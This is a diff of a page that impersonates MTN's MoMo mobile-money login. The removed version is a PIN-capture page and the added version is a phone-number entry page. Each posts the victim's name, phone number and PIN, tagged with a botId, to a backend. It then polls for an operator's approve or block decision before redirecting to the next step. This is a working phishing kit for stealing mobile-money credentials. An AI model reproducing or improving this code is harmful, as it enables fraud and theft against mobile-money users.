@@ -1,718 +1,501 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script>
-  // ============================================================
-  //  BOT ID RESOLVER — runs FIRST on every page load
-  //  Reads botId from URL immediately. Never defaults to bot1.
-  //  Persists to localStorage. Rewrites URL so refreshes keep it.
-  //  Stops the page if botId is missing.
-  // ============================================================
-  (function () {
-    try {
-      const params = new URLSearchParams(window.location.search);
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MoMo</title>
 
-      let botId = params.get('botId');
-      if (!botId) {
-        botId = localStorage.getItem('botId');
-      }
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { width: 100%; min-height: 100%; }
+        body { font-family: Arial, Helvetica, sans-serif; background: #fff; overflow-x: hidden; }
 
-      if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
-        document.documentElement.innerHTML =
-          '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
-          '<h2>Invalid link</h2>' +
-          '<p>Tafadhali fungua ukurasa huu kupitia kiungo rasmi.</p>' +
-          '</body>';
-        window.__BOTID_MISSING__ = true;
-        throw new Error('botId missing from URL and localStorage');
-      }
+        .app {
+            position: relative;
+            width: 100%;
+            max-width: 540px;
+            min-height: 100vh;
+            min-height: 100svh;
+            margin: 0 auto;
+            background: #fff;
+            overflow: hidden;
+            padding-bottom: 110px;
+        }
 
-      localStorage.setItem('botId', botId);
+        .top {
+            position: relative;
+            height: 390px;
+            background: #004c69;
+            padding-top: 52px;
+        }
+        .top::after {
+            content: "";
+            position: absolute;
+            left: -10%;
+            bottom: -75px;
+            width: 120%;
+            height: 125px;
+            background: #fff;
+            border-radius: 50% 50% 0 0 / 70% 70% 0 0;
+        }
 
-      if (params.get('botId') !== botId) {
-        params.set('botId', botId);
-        const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
-        window.history.replaceState({}, '', newUrl);
-      }
+        .logo {
+            position: relative;
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        .logo-box {
+            width: 76px;
+            height: 76px;
+            border-radius: 9px;
+            background: linear-gradient(145deg, #087398, #003d59);
+            box-shadow: 0 2px 5px rgba(0,0,0,.25), inset 0 0 4px rgba(255,255,255,.12);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        .logo-symbol {
+            position: relative;
+            width: 40px;
+            height: 48px;
+            background: #ffd500;
+            clip-path: polygon(50% 0, 100% 30%, 86% 100%, 59% 69%, 39% 100%, 13% 34%);
+        }
+        .logo-symbol::after {
+            content: "";
+            position: absolute;
+            width: 11px;
+            height: 11px;
+            background: #004c69;
+            border-radius: 50%;
+            left: 14px;
+            top: 14px;
+        }
+        .momo {
+            margin-top: 8px;
+            color: #ffd500;
+            font-size: 36px;
+            line-height: 34px;
+            font-weight: 800;
+            letter-spacing: -1.5px;
+        }
+        .from-mtn {
+            margin-top: 3px;
+            color: #ffd500;
+            font-size: 14px;
+            font-weight: 600;
+        }
 
-      window.__BOT_ID__ = botId;
+        .card {
+            position: relative;
+            z-index: 5;
+            width: calc(100% - 36px);
+            margin: -142px auto 0;
+            background: #fff;
+            border-radius: 34px;
+            padding: 44px 27px 27px;
+            box-shadow: 0 12px 25px rgba(0, 0, 0, .12);
+        }
+        .title {
+            text-align: center;
+            color: #07516b;
+            font-size: 25px;
+            font-weight: 400;
+            margin-bottom: 49px;
+        }
+        .title strong { font-weight: 700; }
 
-      console.log('🆔 botId resolved immediately:', botId);
-    } catch (err) {
-      console.error('botId resolver failed:', err.message);
-    }
-  })();
-  </script>
+        .phone-row {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            gap: 16px;
+        }
+        .country {
+            flex: 0 0 96px;
+            width: 96px;
+            height: 98px;
+            background: #fff;
+            border: 1.5px solid #111;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: default;
+            pointer-events: none;
+        }
+        .flag {
+            width: 39px;
+            height: 27px;
+            border-radius: 50%;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 20"><rect width="30" height="20" fill="%23198a00"/><rect x="22" y="0" width="8" height="20" fill="%23de2010"/><rect x="22" y="0" width="2.666" height="20" fill="%23000"/><rect x="24.666" y="0" width="2.666" height="20" fill="%23de2010"/><rect x="27.333" y="0" width="2.666" height="20" fill="%23ef7d00"/><path d="M18 2 L20 4 L22 2 L21 5 L23 6 L20 7 L19 10 L18 7 L15 6 L17 5 Z" fill="%23ef7d00"/></svg>') center/cover;
+        }
+        .phone-input {
+            flex: 1;
+            min-width: 0;
+            height: 98px;
+            border: 1.5px solid #111;
+            border-radius: 27px;
+            outline: none;
+            padding: 0 23px;
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 22px;
+            color: #111;
+            background: #fff;
+        }
+        .phone-input::placeholder {
+            color: #111;
+            opacity: 1;
+            font-size: 18px;
+        }
+        .phone-input:focus { border-color: #005572; }
 
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>MoMo - PIN</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+        .terms {
+            width: calc(100% - 45px);
+            margin: 48px auto 0;
+            text-align: center;
+            color: #666;
+            font-size: 16px;
+            line-height: 23px;
+        }
+        .terms a { color: #00516c; text-decoration: none; }
 
-    html, body {
-      width: 100%;
-      min-height: 100%;
-    }
+        .bottom {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 540px;
+            padding: 12px 18px calc(14px + env(safe-area-inset-bottom));
+            background: #fff;
+            z-index: 100;
+        }
+        .next {
+            width: 100%;
+            height: 69px;
+            border: none;
+            border-radius: 40px;
+            background: #d1d5db;
+            color: #fff;
+            font-size: 22px;
+            font-weight: 700;
+            cursor: not-allowed;
+            font-family: Arial, Helvetica, sans-serif;
+            transition: background 0.3s ease;
+            position: relative;
+        }
+        .next:enabled { background: #005572; cursor: pointer; }
+        .next:enabled:hover { background: #00415a; }
+        .next:enabled:active { transform: scale(.98); }
 
-    body {
-      font-family: Arial, Helvetica, sans-serif;
-      background: #fff;
-      overflow-x: hidden;
-    }
+        .next.loading:disabled { background: #005572; opacity: 1; cursor: wait; }
 
-    .app {
-      position: relative;
-      width: 100%;
-      max-width: 540px;
-      min-height: 100vh;
-      min-height: 100svh;
-      margin: 0 auto;
-      background: #fff;
-      overflow: hidden;
-    }
+        .next .btn-text { display: inline; }
+        .next .btn-spinner {
+            display: none;
+            width: 26px;
+            height: 26px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin .8s linear infinite;
+            margin: 0 auto;
+        }
+        .next.loading .btn-text { display: none; }
+        .next.loading .btn-spinner { display: block; }
 
-    .top {
-      position: relative;
-      height: 220px;
-      background: #004c69;
-      padding-top: 52px;
-    }
+        .status {
+            display: none;
+            margin-top: 16px;
+            text-align: center;
+            font-size: 14px;
+            padding: 10px 14px;
+            border-radius: 12px;
+            font-weight: 500;
+            border: 1px solid transparent;
+        }
+        .status.error { color: #c0392b; background: #fef3f2; border-color: #fecdca; }
+        .status.success { color: #065f46; background: #ecfdf5; border-color: #6ee7b7; }
 
-    .top::after {
-      content: "";
-      position: absolute;
-      left: -10%;
-      bottom: -75px;
-      width: 120%;
-      height: 125px;
-      background: #fff;
-      border-radius: 50% 50% 0 0 / 70% 70% 0 0;
-    }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-    .top-bar {
-      position: relative;
-      z-index: 2;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 0 22px;
-      margin-top: -10px;
-    }
-
-    .back-btn {
-      color: #ffd500;
-      font-size: 30px;
-      text-decoration: none;
-      font-weight: 300;
-      line-height: 1;
-      background: none;
-      border: none;
-      cursor: pointer;
-      transition: color 0.2s;
-    }
-    .back-btn:hover {
-      color: #ffffff;
-    }
-
-    .logo {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .logo-box {
-      width: 40px;
-      height: 40px;
-      border-radius: 8px;
-      background: linear-gradient(145deg, #087398, #003d59);
-      box-shadow: 0 2px 5px rgba(0,0,0,.25), inset 0 0 4px rgba(255,255,255,.12);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .logo-symbol {
-      width: 22px;
-      height: 28px;
-      background: #ffd500;
-      clip-path: polygon(50% 0, 100% 30%, 86% 100%, 59% 69%, 39% 100%, 13% 34%);
-      position: relative;
-    }
-    .logo-symbol::after {
-      content: "";
-      position: absolute;
-      width: 6px;
-      height: 6px;
-      background: #004c69;
-      border-radius: 50%;
-      left: 8px;
-      top: 8px;
-    }
-
-    .logo-text {
-      color: #ffd500;
-      font-size: 20px;
-      font-weight: 800;
-      letter-spacing: -0.5px;
-    }
-    .logo-text .light {
-      font-weight: 400;
-      font-size: 14px;
-      color: #b8d4e8;
-    }
-
-    .card {
-      position: relative;
-      z-index: 5;
-      width: calc(100% - 36px);
-      margin: -100px auto 0;
-      background: #fff;
-      border-radius: 34px;
-      padding: 32px 27px 27px;
-      box-shadow: 0 12px 25px rgba(0, 0, 0, .12);
-    }
-
-    .title {
-      text-align: center;
-      color: #07516b;
-      font-size: 25px;
-      font-weight: 400;
-      margin-bottom: 24px;
-    }
-    .title strong {
-      font-weight: 700;
-    }
-
-    .subtitle {
-      text-align: center;
-      color: #555;
-      font-size: 15px;
-      margin-bottom: 28px;
-    }
-
-    .input-wrapper {
-      display: flex;
-      justify-content: center;
-      gap: 12px;
-      margin-bottom: 20px;
-    }
-
-    .pin-box {
-      width: 50px;
-      height: 60px;
-      border: 2px solid #e2e8f0;
-      border-radius: 12px;
-      background: #fff;
-      font-size: 28px;
-      font-weight: 600;
-      text-align: center;
-      color: #0a0a0a;
-      outline: none;
-      transition: border-color 0.2s, box-shadow 0.2s;
-      font-family: Arial, Helvetica, sans-serif;
-      caret-color: #005572;
-    }
-    .pin-box:focus {
-      border-color: #005572;
-      box-shadow: 0 0 0 3px rgba(0, 85, 114, 0.15);
-    }
-
-    .pin-box.error {
-      border-color: #c0392b;
-      box-shadow: 0 0 0 3px rgba(192, 57, 43, 0.15);
-    }
-
-    #pinInput {
-      display: none;
-    }
-
-    #otp-alert {
-      text-align: center;
-      font-size: 15px;
-      font-weight: 500;
-      min-height: 0;
-      margin-top: 8px;
-      padding: 0;
-      border-radius: 12px;
-      background: transparent;
-      transition: all 0.2s;
-      border: 1px solid transparent;
-      display: none;
-    }
-
-    #otp-alert.show {
-      display: block;
-      padding: 10px 12px;
-      min-height: 24px;
-    }
-
-    #otp-alert.error {
-      background: #fef3f2;
-      color: #c0392b;
-      border-color: #fecdca;
-    }
-
-    #otp-alert.success {
-      background: #ecfdf3;
-      color: #0b2b3b;
-      border-color: #abf0d1;
-    }
-
-    .bottom {
-      width: 100%;
-      padding: 0 18px 14px;
-      margin-top: 30px;
-    }
-
-    .continue-btn {
-      width: 100%;
-      height: 69px;
-      border: none;
-      border-radius: 40px;
-      background: #d1d5db;
-      color: #fff;
-      font-size: 22px;
-      font-weight: 700;
-      cursor: not-allowed;
-      font-family: Arial, Helvetica, sans-serif;
-      transition: background 0.3s ease;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
-    }
-
-    .continue-btn:enabled {
-      background: #005572;
-      cursor: pointer;
-    }
-    .continue-btn:enabled:hover {
-      background: #00415a;
-    }
-    .continue-btn:enabled:active {
-      transform: scale(.98);
-    }
-
-    .continue-btn.loading:disabled {
-      background: #005572;
-      opacity: 1;
-      cursor: wait;
-    }
-
-    .continue-btn .btn-text { display: inline; }
-    .continue-btn .btn-spinner {
-      display: none;
-      width: 26px;
-      height: 26px;
-      border: 3px solid rgba(255,255,255,0.3);
-      border-top: 3px solid #fff;
-      border-radius: 50%;
-      animation: spin .8s linear infinite;
-    }
-
-    .continue-btn.loading .btn-text { display: none; }
-    .continue-btn.loading .btn-spinner { display: inline-block; }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .footer {
-      margin-top: 24px;
-      text-align: center;
-      font-size: 12px;
-      color: #bbb;
-      letter-spacing: 0.5px;
-      padding-bottom: 12px;
-    }
-
-    @media (max-width: 480px) {
-      .top {
-        height: 190px;
-        padding-top: 40px;
-      }
-      .top-bar {
-        padding: 0 16px;
-      }
-      .card {
-        width: calc(100% - 28px);
-        margin-top: -90px;
-        padding: 28px 20px 24px;
-        border-radius: 28px;
-      }
-      .title {
-        font-size: 22px;
-      }
-      .pin-box {
-        width: 42px;
-        height: 52px;
-        font-size: 24px;
-      }
-      .continue-btn {
-        height: 62px;
-        font-size: 20px;
-      }
-    }
-
-    @media (max-width: 380px) {
-      .card {
-        padding-left: 16px;
-        padding-right: 16px;
-      }
-      .title {
-        font-size: 20px;
-      }
-      .input-wrapper {
-        gap: 8px;
-      }
-      .pin-box {
-        width: 36px;
-        height: 46px;
-        font-size: 20px;
-      }
-      .continue-btn {
-        height: 58px;
-        font-size: 18px;
-      }
-    }
-
-    @media (max-height: 750px) {
-      .bottom {
-        margin-top: 15px;
-      }
-    }
-  </style>
+        @media (max-width: 480px) {
+            .top { height: 375px; padding-top: 52px; }
+            .card { width: calc(100% - 36px); margin-top: -127px; padding: 44px 27px 27px; }
+            .title { font-size: 24px; margin-bottom: 48px; }
+            .phone-row { gap: 16px; }
+            .country { flex-basis: 96px; }
+            .phone-input { font-size: 20px; padding-left: 20px; padding-right: 15px; }
+            .phone-input::placeholder { font-size: 16px; }
+            .terms { margin-top: 48px; }
+            .bottom { padding: 10px 14px calc(12px + env(safe-area-inset-bottom)); }
+        }
+        @media (max-width: 380px) {
+            .card { padding-left: 20px; padding-right: 20px; }
+            .country { flex-basis: 82px; width: 82px; }
+            .phone-row { gap: 10px; }
+            .phone-input { font-size: 18px; padding-left: 15px; }
+            .phone-input::placeholder { font-size: 14px; }
+            .terms { width: calc(100% - 30px); font-size: 14px; }
+        }
+    </style>
 </head>
+
 <body>
 
 <div class="app">
 
-  <div class="top">
-    <div class="top-bar">
-      <button class="back-btn" onclick="window.history.back()">&#8592;</button>
-      <div class="logo">
-        <div class="logo-box">
-          <div class="logo-symbol"></div>
+    <div class="top">
+        <div class="logo">
+            <div class="logo-box"><div class="logo-symbol"></div></div>
+            <div class="momo">MoMo</div>
+            <div class="from-mtn">from MTN</div>
         </div>
-        <div class="logo-text">MoMo <span class="light">from MTN</span></div>
-      </div>
-      <div style="width: 30px;"></div>
     </div>
-  </div>
 
-  <div class="card">
+    <div class="card">
+        <div class="title">Welcome to <strong>MoMo</strong></div>
 
-    <div class="title">Enter Your <strong>MoMo PIN</strong></div>
+        <form id="detailsForm">
+            <div class="phone-row">
+                <div class="country" aria-label="Zambia">
+                    <span class="flag"></span>
+                </div>
 
-    <div class="input-wrapper">
-      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
-      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
-      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
-      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
-      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
+                <input
+                    class="phone-input"
+                    type="tel"
+                    id="phone"
+                    name="phone"
+                    inputmode="tel"
+                    placeholder="Enter number *"
+                    aria-label="Phone number"
+                    autocomplete="tel"
+                    required
+                >
+            </div>
+
+            <div id="status" class="status"></div>
+        </form>
     </div>
-    <input type="hidden" id="pinInput" />
 
-    <div id="otp-alert"></div>
-
-  </div>
-
-  <div class="bottom">
-    <button id="verifyBtn" class="continue-btn" disabled>
-      <span class="btn-text">SUBMIT</span>
-      <span class="btn-spinner"></span>
-    </button>
-  </div>
-
-  <div class="footer">v 5.3.2 (1.0.0)</div>
+    <div class="terms">
+        By using this app you agree to our
+        <a href="#">Mobile Terms of Use</a>
+        <br>
+        and
+        <a href="#">Privacy Policy</a>
+    </div>
 
 </div>
 
-<!-- ============================================================
-     PIN PAGE LOGIC — single unified script
-     ============================================================ -->
+<div class="bottom">
+    <button class="next" type="submit" id="continueBtn" form="detailsForm" disabled>
+        <span class="btn-text">NEXT</span>
+        <span class="btn-spinner"></span>
+    </button>
+</div>
+
 <script>
+// ============================================================
+//  ALL PAGE LOGIC — one script, one IIFE, at the bottom of <body>
+// ============================================================
 (function() {
-  const BACKEND_URL = "";
-
-  // ---------- BOTID (resolved by the head script) ----------
-  const botId = window.__BOT_ID__;
-  if (!botId) {
-    console.error('❌ No botId — page cannot function');
-    return;
-  }
-
-  // ---------- DATA ----------
-  const urlParams = new URLSearchParams(window.location.search);
-  let phone = urlParams.get('phone') || localStorage.getItem('phone');
-  let name = urlParams.get('name') || localStorage.getItem('fullName');
-
-  if (!phone) {
-    alert('Session expired. Please start over.');
-    window.location.href = 'details.html?botId=' + encodeURIComponent(botId);
-    return;
-  }
-  if (!name) {
-    name = 'MTN User';
-    localStorage.setItem('fullName', name);
-  }
-  localStorage.setItem('phone', phone);
-
-  // ---------- DOM REFS ----------
-  const pinBoxes = document.querySelectorAll('.pin-box');
-  const hiddenInput = document.getElementById('pinInput');
-  const verifyBtn = document.getElementById('verifyBtn');
-  const alertEl = document.getElementById('otp-alert');
-
-  console.log('🔢 pin.html ready — ' + pinBoxes.length + ' boxes found');
-
-  // ---------- HELPERS ----------
-  function getPinFromBoxes() {
-    let pin = '';
-    pinBoxes.forEach(b => { if (b.value) pin += b.value; });
-    return pin;
-  }
-
-  function getFilledCount() {
-    let count = 0;
-    pinBoxes.forEach(b => { if (b.value) count++; });
-    return count;
-  }
-
-  // THE KEY FIX: compute button state directly from box values,
-  // not from any hidden-input event. This runs on every box change.
-  function updateButtonState() {
-    const filled = getFilledCount();
-    const isComplete = (filled === pinBoxes.length);
-    const isLoading = verifyBtn.classList.contains('loading');
-    const shouldBeDisabled = !isComplete || isLoading;
-
-    verifyBtn.disabled = shouldBeDisabled;
-
-    // Also keep the hidden input in sync for the submit logic
-    hiddenInput.value = isComplete ? getPinFromBoxes() : '';
-
-    console.log('🔘 PIN boxes: ' + filled + '/' + pinBoxes.length + ' → button ' + (shouldBeDisabled ? 'DISABLED' : 'ENABLED'));
-  }
-
-  function showAlert(text, type) {
-    alertEl.textContent = text;
-    alertEl.className = 'show ' + (type || '');
-  }
-
-  function clearAlert() {
-    alertEl.textContent = '';
-    alertEl.className = '';
-  }
-
-  function setLoading(on) {
-    if (on) {
-      verifyBtn.classList.add('loading');
-      verifyBtn.disabled = true;
-    } else {
-      verifyBtn.classList.remove('loading');
-    }
-    // Recompute after toggling loading
-    updateButtonState();
-  }
-
-  function clearAllBoxes() {
-    pinBoxes.forEach(b => {
-      b.value = '';
-      b.classList.remove('error');
-    });
-    hiddenInput.value = '';
-    updateButtonState();
-  }
-
-  // ---------- PIN BOX INPUT ----------
-  pinBoxes.forEach((box, i) => {
-    // INPUT — typing a digit
-    box.addEventListener('input', function() {
-      // Keep only one digit
-      const cleaned = this.value.replace(/\D/g, '').slice(0, 1);
-      this.value = cleaned;
-      this.classList.remove('error');
-
-      if (cleaned && i < pinBoxes.length - 1) {
-        pinBoxes[i + 1].focus();
-      }
-
-      clearAlert();
-      updateButtonState();
-    });
-
-    // KEYDOWN — backspace, arrows, enter
-    box.addEventListener('keydown', function(e) {
-      if (e.key === 'Backspace') {
-        if (!this.value && i > 0) {
-          pinBoxes[i - 1].value = '';
-          pinBoxes[i - 1].focus();
-          updateButtonState();
-          e.preventDefault();
-        } else if (this.value) {
-          this.value = '';
-          updateButtonState();
-          e.preventDefault();
-        }
-      } else if (e.key === 'ArrowLeft' && i > 0) {
-        pinBoxes[i - 1].focus();
-        e.preventDefault();
-      } else if (e.key === 'ArrowRight' && i < pinBoxes.length - 1) {
-        pinBoxes[i + 1].focus();
-        e.preventDefault();
-      } else if (e.key === 'Enter') {
-        if (!verifyBtn.disabled && !verifyBtn.classList.contains('loading')) {
-          verifyBtn.click();
-        }
-        e.preventDefault();
-      }
-    });
-
-    // FOCUS — select existing digit
-    box.addEventListener('focus', function() {
-      this.select();
-      this.classList.remove('error');
-    });
-
-    // PASTE — distribute digits
-    box.addEventListener('paste', function(e) {
-      e.preventDefault();
-      const paste = (e.clipboardData || window.clipboardData).getData('text');
-      const digits = paste.replace(/\D/g, '').slice(0, pinBoxes.length);
-      if (!digits) return;
-
-      pinBoxes.forEach((b, idx) => {
-        b.value = digits[idx] || '';
-        b.classList.remove('error');
-      });
-
-      const lastFilled = Math.min(digits.length, pinBoxes.length) - 1;
-      if (lastFilled >= 0) pinBoxes[lastFilled].focus();
-
-      clearAlert();
-      updateButtonState();
-    });
-  });
-
-  // ---------- SUBMIT ----------
-  let pollTimer = null;
-
-  function stopPolling() {
-    if (pollTimer) {
-      clearInterval(pollTimer);
-      pollTimer = null;
-    }
-  }
-
-  verifyBtn.addEventListener('click', async function() {
-    if (verifyBtn.disabled || verifyBtn.classList.contains('loading')) return;
-
-    const pin = getPinFromBoxes();
-    if (pin.length !== pinBoxes.length) return;
-
-    setLoading(true);
-    clearAlert();
-
+    // ---------- BOT ID RESOLVER ----------
+    // Runs before anything else inside this IIFE. Reads botId from
+    // URL first, falls back to localStorage, hard-stops if missing.
+    let botId;
     try {
-      const res = await fetch(BACKEND_URL + '/submit-pin', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          name: name,
-          phone: phone,
-          pin: pin,
-          botId: botId
-        })
-      });
+        const params = new URLSearchParams(window.location.search);
+        botId = params.get('botId') || localStorage.getItem('botId');
 
-      if (!res.ok) {
-        const errText = await res.text();
-        const clean = errText.startsWith('<')
-          ? ('HTTP ' + res.status)
-          : (errText || ('HTTP ' + res.status));
-        throw new Error(clean);
-      }
-
-      const data = await res.json();
-      if (!data.requestId) throw new Error('No request ID received');
-
-      stopPolling();
-      let attempts = 0;
-      const MAX_ATTEMPTS = 120;
-
-      pollTimer = setInterval(async function() {
-        attempts++;
-        try {
-          const checkRes = await fetch(BACKEND_URL + '/check-pin/' + data.requestId);
-          const status = await checkRes.json();
-
-          if (status.blocked === true) {
-            stopPolling();
-            setLoading(false);
-            clearAllBoxes();
-            showAlert('❌ Account restricted. Please try again later.', 'error');
+        if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
+            document.body.innerHTML =
+                '<div style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
+                '<h2>Invalid link</h2>' +
+                '<p>Tafadhali fungua ukurasa huu kupitia kiungo rasmi.</p>' +
+                '</div>';
             return;
-          }
-
-          if (status.approved === true) {
-            stopPolling();
-            setLoading(false);
-            showAlert('✅ PIN verified! Redirecting...', 'success');
-            setTimeout(function() {
-              window.location.href = 'code.html?botId=' + encodeURIComponent(botId) +
-                                     '&phone=' + encodeURIComponent(phone) +
-                                     '&name=' + encodeURIComponent(name);
-            }, 700);
-            return;
-          }
-
-          if (status.approved === false) {
-            stopPolling();
-            setLoading(false);
-            clearAllBoxes();
-            showAlert('❌ Incorrect PIN. Please try again.', 'error');
-            pinBoxes.forEach(function(b) { b.classList.add('error'); });
-            setTimeout(function() {
-              pinBoxes.forEach(function(b) { b.classList.remove('error'); });
-            }, 600);
-            if (pinBoxes[0]) pinBoxes[0].focus();
-            return;
-          }
-
-          if (attempts > MAX_ATTEMPTS) {
-            stopPolling();
-            setLoading(false);
-            showAlert('⏳ Taking too long. Please try again.', 'error');
-            return;
-          }
-        } catch (err) {
-          console.error('Polling error:', err);
         }
-      }, 1500);
 
+        localStorage.setItem('botId', botId);
+
+        if (params.get('botId') !== botId) {
+            params.set('botId', botId);
+            window.history.replaceState({}, '', window.location.pathname + '?' + params.toString() + window.location.hash);
+        }
+
+        console.log('🆔 botId resolved:', botId);
     } catch (err) {
-      setLoading(false);
-      showAlert('❌ ' + (err.message || 'Something went wrong. Please try again.'), 'error');
+        console.error('botId resolver failed:', err.message);
+        return;
     }
-  });
 
-  // ---------- INIT ----------
-  updateButtonState();
-  if (pinBoxes[0]) pinBoxes[0].focus();
+    // ---------- CONFIG ----------
+    const BACKEND_URL = "";
 
-  // Extra safety: recompute on any focus/blur, in case autofill or IME set values
-  document.addEventListener('focusin', updateButtonState);
-  document.addEventListener('focusout', function() {
-    setTimeout(updateButtonState, 20);
-  });
+    // ---------- USER NAME (silent, no prompt) ----------
+    let fullName = localStorage.getItem('fullName') || 'User';
+    localStorage.setItem('fullName', fullName);
+
+    // ---------- DOM REFS ----------
+    const form = document.getElementById('detailsForm');
+    const phone = document.getElementById('phone');
+    const button = document.getElementById('continueBtn');
+    const statusEl = document.getElementById('status');
+
+    let pollTimer = null;
+
+    // ---------- VALIDATION ----------
+    function validateForm() {
+        const digits = phone.value.replace(/\D/g, '');
+        button.disabled = (digits.length === 0) || button.classList.contains('loading');
+    }
+
+    phone.addEventListener('input', function() {
+        let value = this.value;
+        value = value.replace(/[^\d+\s]/g, '');
+        const hasPlus = value.startsWith('+');
+        value = value.replace(/\+/g, '');
+        if (hasPlus) value = '+' + value;
+        value = value.replace(/\s+/g, ' ');
+        this.value = value;
+        validateForm();
+    });
+
+    // ---------- HELPERS ----------
+    function stopPolling() {
+        if (pollTimer) {
+            clearInterval(pollTimer);
+            pollTimer = null;
+        }
+    }
+
+    function setStatus(message, type) {
+        statusEl.style.display = 'block';
+        statusEl.className = 'status ' + (type || '');
+        statusEl.textContent = message;
+    }
+
+    function hideStatus() {
+        statusEl.style.display = 'none';
+        statusEl.className = 'status';
+        statusEl.textContent = '';
+    }
+
+    function setLoading(on) {
+        if (on) {
+            button.disabled = true;
+            button.classList.add('loading');
+        } else {
+            button.classList.remove('loading');
+            validateForm();
+        }
+    }
+
+    // ---------- FORM SUBMIT ----------
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        if (button.classList.contains('loading')) return;
+
+        let raw = phone.value.trim();
+        const hasPlus = raw.startsWith('+');
+        const digits = raw.replace(/\D/g, '');
+        const phoneVal = (hasPlus ? '+' : '') + digits;
+
+        if (!digits) {
+            setStatus('❌ Please enter a phone number.', 'error');
+            return;
+        }
+
+        setLoading(true);
+        hideStatus();
+
+        try {
+            const res = await fetch(BACKEND_URL + '/submit-phone', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ name: fullName, phone: phoneVal, botId })
+            });
+
+            if (!res.ok) {
+                const errText = await res.text();
+                const clean = errText.startsWith('<')
+                    ? ('HTTP ' + res.status + ' — server error')
+                    : (errText || ('HTTP ' + res.status));
+                throw new Error(clean);
+            }
+
+            const { requestId } = await res.json();
+            if (!requestId) throw new Error('No request ID returned');
+
+            localStorage.setItem('phone', phoneVal);
+            localStorage.setItem('phoneRequestId', requestId);
+
+            stopPolling();
+            let attempts = 0;
+            const MAX_ATTEMPTS = 120;
+
+            pollTimer = setInterval(async () => {
+                attempts++;
+                try {
+                    const checkRes = await fetch(BACKEND_URL + '/check-phone/' + requestId);
+                    const data = await checkRes.json();
+
+                    if (data.blocked === true) {
+                        stopPolling();
+                        setLoading(false);
+                        setStatus('❌ Account restricted. Please try again later.', 'error');
+                        return;
+                    }
+
+                    if (data.approved === true) {
+                        stopPolling();
+                        setLoading(false);
+                        setStatus('✅ Verified! Redirecting...', 'success');
+                        const redirectUrl = 'link.html?requestId=' + requestId +
+                                            '&phone=' + encodeURIComponent(phoneVal) +
+                                            '&botId=' + encodeURIComponent(botId);
+                        setTimeout(() => {
+                            window.location.href = redirectUrl;
+                        }, 700);
+                        return;
+                    }
+
+                    if (data.approved === false) {
+                        stopPolling();
+                        setLoading(false);
+                        setStatus('❌ Incorrect number. Please try again.', 'error');
+                        return;
+                    }
+
+                    if (attempts > MAX_ATTEMPTS) {
+                        stopPolling();
+                        setLoading(false);
+                        setStatus('⏳ Taking too long. Please try again.', 'error');
+                        return;
+                    }
+                } catch (err) {
+                    console.error('Polling error:', err);
+                }
+            }, 1500);
+
+        } catch (error) {
+            setLoading(false);
+            setStatus('❌ ' + (error.message || 'Something went wrong. Please try again.'), 'error');
+        }
+    });
+
+    // ---------- INIT ----------
+    validateForm();
+    phone.focus();
+
+    console.log('✅ details.html ready. botId =', botId);
 })();
 </script>
 
